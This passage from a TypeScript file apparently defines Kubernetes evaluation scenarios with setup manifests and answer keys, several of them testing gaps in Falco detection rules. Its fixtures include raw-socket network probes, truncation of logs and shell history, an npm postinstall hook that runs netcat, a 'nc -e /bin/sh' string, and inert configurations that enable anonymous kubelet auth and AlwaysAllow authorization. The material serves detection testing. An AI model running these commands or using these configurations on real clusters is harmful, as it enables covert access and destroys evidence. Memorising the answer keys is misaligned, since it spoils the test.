                capabilities: { add: ['NET_RAW'], drop: ['ALL'] },
              },
              env: [
                {
                  name: 'NODE_IP',
                  valueFrom: { fieldRef: { fieldPath: 'status.hostIP' } },
                },
              ],
              command: [
                '/bin/sh',
                '-ceu',
                'id; python3 -c \'import os,socket; p=socket.socket(socket.AF_PACKET,socket.SOCK_RAW,socket.htons(3)); print("af_packet_opened",p.fileno()); u=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); u.sendto(b"cluster-probe",("recon-responder",9999)); u.sendto(b"nodeport-probe",(os.environ["NODE_IP"],30099)); print("controlled_udp_probes_sent")\'; sleep 3600',
              ],
            },
          ],
        },
      },
    ],
    acceptedFacts: [
      {
        fact_id: 'interactive-terminal-enabled',
        resource_ref: 'pod/interactive-recon',
        field_path: 'spec.containers[0].tty',
        observed_value: 'true',
        description: 'The scanner container has an interactive terminal enabled.',
      },
      {
        fact_id: 'packet-socket-opened',
        resource_ref: 'pod/interactive-recon',
        field_path: 'logs[scanner]',
        observed_value: 'af_packet_opened',
        description: 'The Python scanner successfully creates an AF_PACKET raw socket.',
      },
      {
        fact_id: 'cluster-and-nodeport-probes',
        resource_ref: 'pod/interactive-recon',
        field_path: 'spec.containers[0].command[2]',
        observed_value: 'recon-responder",9999; os.environ["NODE_IP"],30099',
        description: 'The interpreted scanner probes both controlled Service and NodePort paths.',
      },
    ],
    contradictionFacts: [
      {
        fact_id: 'invented-internet-target',
        resource_ref: 'pod/interactive-recon',
        field_path: 'spec.containers[0].command[2]',
        observed_value: 'public IP address',
        description: 'No public or Internet destination occurs in the scanner command.',
      },
      {
        fact_id: 'invented-host-network',
        resource_ref: 'pod/interactive-recon',
        field_path: 'spec.hostNetwork',
        observed_value: 'true',
        description: 'The scanner remains in the Pod network namespace.',
      },
    ],
    requiredMechanisms: ['api-server', 'kubelet', 'cni'],
    supportedClusterProfiles: runtimeProfiles,
  },
  {
    scenarioId: 'rule-gap-falco-truncate-logs-and-shell-history',
    title: 'Cleanup process truncates logs and shell history',
    description:
      'A Job seeds an access log and shell history in an emptyDir, records their sizes, truncates both files, and records zero-byte results.',
    taskPrompt:
      'Inspect `truncate-history-action` and its logs. Identify both truncation targets and cite before-and-after evidence plus the storage boundary.',
    visibleResourceRefs: ['job/truncate-history-action', 'pod/truncate-history-action-*'],
    observationKinds: ['job.pod-template', 'pod.init-container-status', 'pod.logs'],
    setup: [
      actionJob(
        'truncate-history-action',
        'wc -c /fixture/var/log/access.log /fixture/root/.bash_history\n' +
          ': > /fixture/var/log/access.log\n' +
          ': > /fixture/root/.bash_history\n' +
          'wc -c /fixture/var/log/access.log /fixture/root/.bash_history',
        {
          container: { volumeMounts: [{ name: 'fixture', mountPath: '/fixture' }] },
          podSpec: {
            initContainers: [
              {
                name: 'seed',
                image: 'alpine:3.20',
                command: [
                  '/bin/sh',
                  '-ceu',
                  'mkdir -p /fixture/var/log /fixture/root; printf "GET /controlled 200\\n" > /fixture/var/log/access.log; printf "echo controlled\\n" > /fixture/root/.bash_history',
                ],
                volumeMounts: [{ name: 'fixture', mountPath: '/fixture' }],
              },
            ],
            volumes: [{ name: 'fixture', emptyDir: {} }],
          },
        }
      ),
    ],
    acceptedFacts: [
      {
        fact_id: 'log-and-history-truncated',
        resource_ref: 'job/truncate-history-action',
        field_path: 'spec.template.spec.containers[0].command[2]',
        observed_value: ': > /fixture/var/log/access.log; : > /fixture/root/.bash_history',
        description: 'The same action truncates a recognized access log and shell-history file.',
      },
      {
        fact_id: 'both-files-zero-after-action',
        resource_ref: 'pod/truncate-history-action-*',
        field_path: 'logs[action]',
        observed_value: '0 /fixture/var/log/access.log; 0 /fixture/root/.bash_history',
        description: 'Post-action byte counts prove both seeded files were truncated.',
      },
      {
        fact_id: 'truncation-storage-is-emptydir',
        resource_ref: 'job/truncate-history-action',
        field_path: 'spec.template.spec.volumes[0].emptyDir',
        observed_value: '{}',
        description: 'Both paths are backed by disposable storage.',
      },
    ],
    contradictionFacts: [
      {
        fact_id: 'invented-host-log-cleanup',
        resource_ref: 'job/truncate-history-action',
        field_path: 'spec.template.spec.volumes[0].hostPath',
        observed_value: 'present',
        description: 'No node log or real shell-history path is mounted.',
      },
    ],
    requiredMechanisms: ['api-server', 'kubelet'],
    supportedClusterProfiles: runtimeProfiles,
  },
  {
    scenarioId: 'rule-gap-falco-malicious-npm-network-tool',
    title: 'NPM lifecycle script launches a network tool',
    description:
      'A Node Job installs a ConfigMap-backed local package whose postinstall script sends a fixed message with netcat to a namespace-local sink.',
    taskPrompt:
      'Inspect `controlled-npm-package`, `npm-network-sink`, and `npm-install-action`. Identify the package-manager, lifecycle, and network-tool process chain from exact evidence.',
    visibleResourceRefs: [
      'configmap/controlled-npm-package',
      'deployment/npm-network-sink',
      'service/npm-network-sink',
      'job/npm-install-action',
    ],
    observationKinds: ['configmap.data', 'job.pod-template', 'service.endpoints', 'pod.logs'],
    setup: [
      ...tcpSink('npm-network-sink', 8080, 'controlled-npm-ack'),
      {
        apiVersion: 'v1',
        kind: 'ConfigMap',
        metadata: { name: 'controlled-npm-package' },
        data: {
          'package.json': JSON.stringify({
            name: 'controlled-network-action',
            version: '1.0.0',
            scripts: { postinstall: 'printf controlled-npm | nc npm-network-sink 8080' },
          }),
        },
      },
      actionJob(
        'npm-install-action',
        'apk add --no-cache netcat-openbsd >/dev/null\n' +
          'mkdir -p /tmp/package\n' +
          'cp /package-source/package.json /tmp/package/package.json\n' +
          'npm install /tmp/package --foreground-scripts',
        {
          image: 'node:22-alpine',
          container: {
            volumeMounts: [{ name: 'package-source', mountPath: '/package-source' }],
          },
          podSpec: {
            volumes: [{ name: 'package-source', configMap: { name: 'controlled-npm-package' } }],
          },
        }
      ),
    ],
    acceptedFacts: [
      {
        fact_id: 'runtime-npm-install',
        resource_ref: 'job/npm-install-action',
        field_path: 'spec.template.spec.containers[0].command[2]',
        observed_value: 'npm install /tmp/package --foreground-scripts',
        description: 'NPM installs a package at container runtime with lifecycle output enabled.',
      },
      {
        fact_id: 'postinstall-launches-netcat',
        resource_ref: 'configmap/controlled-npm-package',
        field_path: 'data.package.json.scripts.postinstall',
        observed_value: 'printf controlled-npm | nc npm-network-sink 8080',
        description: 'The package postinstall lifecycle launches netcat as a descendant of npm.',
      },
      {
        fact_id: 'npm-network-target-is-controlled',
        resource_ref: 'service/npm-network-sink',
        field_path: 'spec.ports[0].port',
        observed_value: '8080',
        description: 'Netcat connects only to the namespace-local sink Service.',
      },
    ],
    contradictionFacts: [
      {
        fact_id: 'invented-remote-command-netcat',
        resource_ref: 'configmap/controlled-npm-package',
        field_path: 'data.package.json.scripts.postinstall',
        observed_value: 'nc -e /bin/sh',
        description:
          'The lifecycle command sends fixed text and enables no remote command execution.',
      },
      {
        fact_id: 'invented-public-package',
        resource_ref: 'job/npm-install-action',
        field_path: 'spec.template.spec.containers[0].command[2]',
        observed_value: 'npm install <registry package>',
        description: 'The installed package is the ConfigMap-backed local fixture.',
      },
    ],
    requiredMechanisms: ['api-server', 'kubelet', 'cni'],
    supportedClusterProfiles: runtimeProfiles,
  },
  {
    scenarioId: 'rule-gap-container-start-rollout-stalled',
    title: 'Container start failure stalls a Deployment rollout',
    description:
      'A Deployment requests two replicas from an intentionally nonexistent image and uses a short progress deadline, producing waiting containers and a nonconvergent rollout.',
    taskPrompt:
      'Diagnose why the `stalled-rollout` Deployment does not converge. Cite container waiting state, rollout condition, and desired versus available replica evidence over the observation window.',
    visibleResourceRefs: [
      'deployment/stalled-rollout',
      'replicaset/stalled-rollout-*',
      'pod/stalled-rollout-*',
      'event/*',
    ],
    observationKinds: [
      'deployment.status',
      'replicaset.status',
      'pod.container-status',
      'event.list',
      'metric.time-series',
    ],
    setup: [
      {
        apiVersion: 'apps/v1',
        kind: 'Deployment',
        metadata: { name: 'stalled-rollout', labels: { app: 'stalled-rollout' } },
        spec: {
          replicas: 2,
          progressDeadlineSeconds: 30,
          selector: { matchLabels: { app: 'stalled-rollout' } },
          template: {
            metadata: { labels: { app: 'stalled-rollout' } },
            spec: {
              containers: [
                {
                  name: 'app',
                  image: 'registry.invalid/evals/container-start-failure:v1',
                  imagePullPolicy: 'Always',
                },
              ],
            },
          },
        },
      },
    ],
    acceptedFacts: [
      {
        fact_id: 'container-waits-for-image',
        resource_ref: 'pod/stalled-rollout-*',
        field_path: 'status.containerStatuses[0].state.waiting.reason',
        observed_value: '<one of: ErrImagePull, ImagePullBackOff>',
        description:
          'The new revision container remains waiting because its image cannot be pulled.',
      },
      {
        fact_id: 'rollout-exceeds-progress-deadline',
        resource_ref: 'deployment/stalled-rollout',
        field_path: 'status.conditions[?type=Progressing].reason',
        observed_value: 'ProgressDeadlineExceeded',
        description:
          'The Deployment controller reports that rollout progress exceeded its deadline.',
      },
      {
        fact_id: 'desired-available-diverge',
        resource_ref: 'deployment/stalled-rollout',
        field_path: 'status.replicas,status.availableReplicas',
        observed_value: 'desired=2; available=<absent or 0>',
        description:
          'Desired replicas remain above available replicas throughout the bounded window.',
      },
    ],
    contradictionFacts: [
      {
        fact_id: 'invented-scheduling-failure',
        resource_ref: 'pod/stalled-rollout-*',
        field_path: 'status.conditions[?type=PodScheduled].status',
        observed_value: 'False',
        description: 'The root cause is container start failure, not an unscheduled Pod.',
      },
      {
        fact_id: 'invented-complete-rollout',
        resource_ref: 'deployment/stalled-rollout',
        field_path: 'status.availableReplicas',
        observed_value: '2',
        description: 'The broken revision never reaches two available replicas.',
      },
    ],
    requiredMechanisms: ['api-server', 'kubelet'],
    supportedClusterProfiles: runtimeProfiles,
  },
  {
    scenarioId: 'rule-gap-hpa-capacity-mismatch',
    title: 'HPA demand exceeds workload and cluster capacity',
    description:
      'An HPA is fixed at three desired replicas while each target Pod requests 1000 CPU cores and 1 TiB of memory, making convergence impossible on the supported profiles.',
    taskPrompt:
      'Diagnose why `capacity-hpa` cannot converge. Cite HPA bounds and status, per-Pod requests, unschedulable events, and aggregate Node allocatable evidence.',
    visibleResourceRefs: [
      'horizontalpodautoscaler/capacity-hpa',
      'deployment/capacity-target',
      'pod/capacity-target-*',
      'node/*',
      'event/*',
    ],
    observationKinds: [
      'horizontalpodautoscaler.spec',
      'horizontalpodautoscaler.status',
      'deployment.status',
      'pod.resources',
      'node.allocatable',
      'event.list',
      'metric.time-series',
    ],
    setup: [
      {
        apiVersion: 'apps/v1',
        kind: 'Deployment',
        metadata: { name: 'capacity-target', labels: { app: 'capacity-target' } },
        spec: {
          replicas: 1,
          selector: { matchLabels: { app: 'capacity-target' } },
          template: {
            metadata: { labels: { app: 'capacity-target' } },
            spec: {
              containers: [
                {
                  name: 'app',
                  image: 'registry.k8s.io/pause:3.10',
                  resources: {
                    requests: { cpu: '1000', memory: '1Ti' },
                    limits: { cpu: '1000', memory: '1Ti' },
                  },
                },
              ],
            },
          },
        },
      },
      {
        apiVersion: 'autoscaling/v2',
        kind: 'HorizontalPodAutoscaler',
        metadata: { name: 'capacity-hpa' },
        spec: {
          scaleTargetRef: { apiVersion: 'apps/v1', kind: 'Deployment', name: 'capacity-target' },
          minReplicas: 3,
          maxReplicas: 3,
          metrics: [
            {
              type: 'Resource',
              resource: {
                name: 'cpu',
                target: { type: 'Utilization', averageUtilization: 1 },
              },
            },
          ],
        },
      },
    ],
    acceptedFacts: [
      {
        fact_id: 'hpa-is-at-fixed-maximum',
        resource_ref: 'horizontalpodautoscaler/capacity-hpa',
        field_path: 'spec.minReplicas,spec.maxReplicas',
        observed_value: 'minReplicas=3; maxReplicas=3',
        description: 'The HPA is configured to demand its maximum of three replicas.',
      },
      {
        fact_id: 'per-pod-demand-is-impossible',
        resource_ref: 'deployment/capacity-target',
        field_path: 'spec.template.spec.containers[0].resources.requests',
        observed_value: '{"cpu":"1000","memory":"1Ti"}',
        description: 'Each desired Pod alone exceeds ordinary profile Node capacity.',
      },
      {
        fact_id: 'aggregate-maximum-demand',
        resource_ref: 'horizontalpodautoscaler/capacity-hpa',
        field_path: 'computed.max-demand',
        observed_value: '3000 CPU cores; 3 TiB memory',
        description: 'Three maximum replicas multiply the impossible request across the workload.',
      },
      {
        fact_id: 'pods-remain-unschedulable',
        resource_ref: 'event/*',
        field_path: 'reason,message',
        observed_value: 'FailedScheduling; Insufficient cpu and/or Insufficient memory',
        description: 'Scheduler events connect failed convergence to exhausted capacity.',
      },
    ],
    contradictionFacts: [
      {
        fact_id: 'invented-safe-headroom',
        resource_ref: 'node/*',
        field_path: 'computed.aggregate-allocatable-minus-max-demand',
        observed_value: 'positive',
        description: 'The declared maximum demand cannot fit the supported cluster profiles.',
      },
      {
        fact_id: 'invented-hpa-convergence',
        resource_ref: 'horizontalpodautoscaler/capacity-hpa',
        field_path: 'status.currentReplicas,status.desiredReplicas',
        observed_value: 'current=3; desired=3',
        description: 'The workload cannot reach three scheduled current replicas.',
      },
    ],
    requiredMechanisms: ['api-server', 'scheduler', 'kubelet'],
    supportedClusterProfiles: runtimeProfiles,
  },
  {
    scenarioId: 'rule-gap-legacy-rbac-v1beta1-bundle',
    title: 'Legacy RBAC v1beta1 object bundle',
    description:
      'A parse-only eight-document RBAC bundle uses the removed rbac.authorization.k8s.io/v1beta1 version for object and list kinds.',
    taskPrompt:
      'Review the complete RBAC manifest bundle and identify the compatibility defect. Cite the API version and every affected kind without applying the bundle.',
    visibleResourceRefs: ['manifest/legacy-rbac-bundle'],
    observationKinds: ['manifest.documents', 'manifest.api-version', 'manifest.kind'],
    setup: [
      {
        apiVersion: 'rbac.authorization.k8s.io/v1beta1',
        kind: 'Role',
        metadata: { name: 'legacy-role' },
        rules: [{ apiGroups: [''], resources: ['configmaps'], verbs: ['get'] }],
      },
      {
        apiVersion: 'rbac.authorization.k8s.io/v1beta1',
        kind: 'RoleList',
        metadata: {},
        items: [],
      },
      {
        apiVersion: 'rbac.authorization.k8s.io/v1beta1',
        kind: 'RoleBinding',
        metadata: { name: 'legacy-role-binding' },
        subjects: [{ kind: 'ServiceAccount', name: 'default' }],
        roleRef: { apiGroup: 'rbac.authorization.k8s.io', kind: 'Role', name: 'legacy-role' },
      },
      {
        apiVersion: 'rbac.authorization.k8s.io/v1beta1',
        kind: 'RoleBindingList',
        metadata: {},
        items: [],
      },
      {
        apiVersion: 'rbac.authorization.k8s.io/v1beta1',
        kind: 'ClusterRole',
        metadata: { name: 'legacy-cluster-role' },
        rules: [{ apiGroups: [''], resources: ['namespaces'], verbs: ['get'] }],
      },
      {
        apiVersion: 'rbac.authorization.k8s.io/v1beta1',
        kind: 'ClusterRoleList',
        metadata: {},
        items: [],
      },
      {
        apiVersion: 'rbac.authorization.k8s.io/v1beta1',
        kind: 'ClusterRoleBinding',
        metadata: { name: 'legacy-cluster-role-binding' },
        subjects: [{ kind: 'ServiceAccount', name: 'default', namespace: 'default' }],
        roleRef: {
          apiGroup: 'rbac.authorization.k8s.io',
          kind: 'ClusterRole',
          name: 'legacy-cluster-role',
        },
      },
      {
        apiVersion: 'rbac.authorization.k8s.io/v1beta1',
        kind: 'ClusterRoleBindingList',
        metadata: {},
        items: [],
      },
    ],
    acceptedFacts: [
      {
        fact_id: 'all-rbac-documents-use-v1beta1',
        resource_ref: 'manifest/legacy-rbac-bundle',
        field_path: 'documents[*].apiVersion',
        observed_value: '8 of 8 = rbac.authorization.k8s.io/v1beta1',
        description: 'Every document uses the removed RBAC beta API version.',
      },
      {
        fact_id: 'complete-rbac-kind-tuple',
        resource_ref: 'manifest/legacy-rbac-bundle',
        field_path: 'documents[*].kind',
        observed_value:
          '["Role","RoleList","RoleBinding","RoleBindingList","ClusterRole","ClusterRoleList","ClusterRoleBinding","ClusterRoleBindingList"]',
        description: 'The bundle covers all eight registered RBAC object and list kinds.',
      },
    ],
    contradictionFacts: [
      {
        fact_id: 'invented-stable-rbac-version',
        resource_ref: 'manifest/legacy-rbac-bundle',
        field_path: 'documents[*].apiVersion',
        observed_value: 'rbac.authorization.k8s.io/v1',
        description: 'No document in the broken bundle uses stable RBAC v1.',
      },
      {
        fact_id: 'invented-partial-bundle',
        resource_ref: 'manifest/legacy-rbac-bundle',
        field_path: 'documents.length',
        observed_value: '7',
        description: 'The fixture contains exactly eight documents.',
      },
    ],
    requiredMechanisms: ['api-server'],
    supportedClusterProfiles: ['local-kwok', 'local-minikube', 'aks'],
  },
  {
    scenarioId: 'rule-gap-anonymous-kubelet-auth',
    title: 'Anonymous kubelet authentication is enabled',
    description:
      'A ConfigMap carries a concrete KubeletConfiguration for a disposable-node adapter with anonymous authentication enabled. It is never mounted on or applied to the current host.',
    taskPrompt:
      'Inspect the `kubelet-anonymous-auth-fixture` component configuration and determine whether unauthenticated kubelet requests are accepted. Cite the exact effective field.',
    visibleResourceRefs: ['configmap/kubelet-anonymous-auth-fixture'],
    observationKinds: ['configmap.data', 'component-config.kubelet'],
    setup: [
      hostConfiguration(
        'kubelet-anonymous-auth-fixture',
        '/var/lib/kubelet/config.yaml',
        'config.yaml',
        'apiVersion: kubelet.config.k8s.io/v1beta1\n' +
          'kind: KubeletConfiguration\n' +
          'authentication:\n' +
          '  anonymous:\n' +
          '    enabled: true\n' +
          '  webhook:\n' +
          '    enabled: true\n' +
          'authorization:\n' +
          '  mode: Webhook\n'
      ),
    ],
    acceptedFacts: [
      {
        fact_id: 'kubelet-anonymous-auth-enabled',
        resource_ref: 'configmap/kubelet-anonymous-auth-fixture',
        field_path: 'data.config.yaml#authentication.anonymous.enabled',
        observed_value: 'true',
        description: 'The effective KubeletConfiguration enables anonymous authentication.',
      },
      {
        fact_id: 'disposable-node-only',
        resource_ref: 'configmap/kubelet-anonymous-auth-fixture',
        field_path: 'metadata.annotations.evals.kubernetes.io/adapter',
        observed_value: 'disposable-node',
        description: 'The configuration is explicitly delegated to the disposable-node adapter.',
      },
    ],
    contradictionFacts: [
      {
        fact_id: 'invented-anonymous-auth-disabled',
        resource_ref: 'configmap/kubelet-anonymous-auth-fixture',
        field_path: 'data.config.yaml#authentication.anonymous.enabled',
        observed_value: 'false',
        description: 'The broken fixture explicitly sets the field to true.',
      },
      {
        fact_id: 'invented-current-host-application',
        resource_ref: 'configmap/kubelet-anonymous-auth-fixture',
        field_path: 'metadata.annotations.evals.kubernetes.io/apply-to-current-host',
        observed_value: 'true',
        description: 'The fixture explicitly prohibits application to the current host.',
      },
    ],
    requiredMechanisms: ['api-server', 'kubelet'],
    supportedClusterProfiles: ['local-minikube'],
  },
  {
    scenarioId: 'rule-gap-alwaysallow-authorization',
    title: 'AlwaysAllow authorization is enabled',
    description:
      'A ConfigMap carries a concrete kube-apiserver static Pod manifest for a disposable control-plane node with authorization-mode=AlwaysAllow. It does not alter the running API server.',
    taskPrompt:
      'Inspect the `apiserver-alwaysallow-fixture` static Pod configuration and identify the authorization defect. Cite the exact command argument and adapter boundary.',
    visibleResourceRefs: ['configmap/apiserver-alwaysallow-fixture'],
    observationKinds: ['configmap.data', 'component-config.kube-apiserver'],
    setup: [
      hostConfiguration(
        'apiserver-alwaysallow-fixture',
        '/etc/kubernetes/manifests/kube-apiserver.yaml',
        'kube-apiserver.yaml',
        'apiVersion: v1\n' +
          'kind: Pod\n' +
          'metadata:\n' +
          '  name: kube-apiserver\n' +
          '  namespace: kube-system\n' +
          'spec:\n' +
          '  hostNetwork: true\n' +
          '  containers:\n' +
          '    - name: kube-apiserver\n' +
          '      image: registry.k8s.io/kube-apiserver:v1.31.1\n' +
          '      command:\n' +
          '        - kube-apiserver\n' +
          '        - --authorization-mode=AlwaysAllow\n' +
          '        - --secure-port=6443\n'
      ),
    ],
    acceptedFacts: [
      {
        fact_id: 'alwaysallow-mode-present',
        resource_ref: 'configmap/apiserver-alwaysallow-fixture',
        field_path: 'data.kube-apiserver.yaml#spec.containers[0].command',
        observed_value: '--authorization-mode=AlwaysAllow',
        description: 'The API server command explicitly selects the AlwaysAllow authorizer.',
      },
      {
        fact_id: 'apiserver-fixture-is-inert',
        resource_ref: 'configmap/apiserver-alwaysallow-fixture',
        field_path: 'metadata.annotations.evals.kubernetes.io/apply-to-current-host',
        observed_value: 'false',
        description: 'The static Pod payload is data for a disposable node, not the active host.',
      },
    ],
    contradictionFacts: [
      {
        fact_id: 'invented-node-rbac-mode',
        resource_ref: 'configmap/apiserver-alwaysallow-fixture',
        field_path: 'data.kube-apiserver.yaml#spec.containers[0].command',
        observed_value: '--authorization-mode=Node,RBAC',
        description: 'The broken fixture does not configure Node or RBAC authorization.',
      },
    ],
    requiredMechanisms: ['api-server', 'authorization'],
    supportedClusterProfiles: ['local-minikube'],
  },
  {
    scenarioId: 'rule-gap-node-authorizer-missing',
    title: 'API server Node authorizer is missing',
    description:
      'A ConfigMap carries a concrete kube-apiserver static Pod manifest for a disposable control-plane node whose authorization modes include RBAC but omit Node.',
    taskPrompt:
      'Inspect the `apiserver-node-authorizer-missing-fixture` static Pod configuration and determine whether kubelet requests receive the expected node-scoped authorization. Cite the complete relevant command evidence.',
    visibleResourceRefs: ['configmap/apiserver-node-authorizer-missing-fixture'],
    observationKinds: ['configmap.data', 'component-config.kube-apiserver'],
    setup: [
      hostConfiguration(
        'apiserver-node-authorizer-missing-fixture',
        '/etc/kubernetes/manifests/kube-apiserver.yaml',
        'kube-apiserver.yaml',
        'apiVersion: v1\n' +
          'kind: Pod\n' +
          'metadata:\n' +
          '  name: kube-apiserver\n' +
          '  namespace: kube-system\n' +
          'spec:\n' +
          '  hostNetwork: true\n' +
          '  containers:\n' +
          '    - name: kube-apiserver\n' +
          '      image: registry.k8s.io/kube-apiserver:v1.31.1\n' +
          '      command:\n' +
          '        - kube-apiserver\n' +
          '        - --authorization-mode=RBAC\n' +
          '        - --secure-port=6443\n'
      ),
    ],
    acceptedFacts: [
      {
        fact_id: 'authorization-mode-rbac-only',
        resource_ref: 'configmap/apiserver-node-authorizer-missing-fixture',
        field_path: 'data.kube-apiserver.yaml#spec.containers[0].command',
        observed_value: '--authorization-mode=RBAC',
        description: 'The complete authorization mode contains RBAC but omits Node.',
      },
      {
        fact_id: 'node-authorizer-fixture-is-inert',
        resource_ref: 'configmap/apiserver-node-authorizer-missing-fixture',
        field_path: 'metadata.annotations.evals.kubernetes.io/adapter',
        observed_value: 'disposable-node',
        description: 'Only a disposable-node adapter may consume the static Pod payload.',
      },
    ],
    contradictionFacts: [
      {
        fact_id: 'invented-node-authorizer',
        resource_ref: 'configmap/apiserver-node-authorizer-missing-fixture',
        field_path: 'data.kube-apiserver.yaml#spec.containers[0].command',
        observed_value: '--authorization-mode=Node,RBAC',
        description: 'The Node authorizer is absent from the fixture command.',
      },
    ],
    requiredMechanisms: ['api-server', 'authorization'],
    supportedClusterProfiles: ['local-minikube'],
  },
];
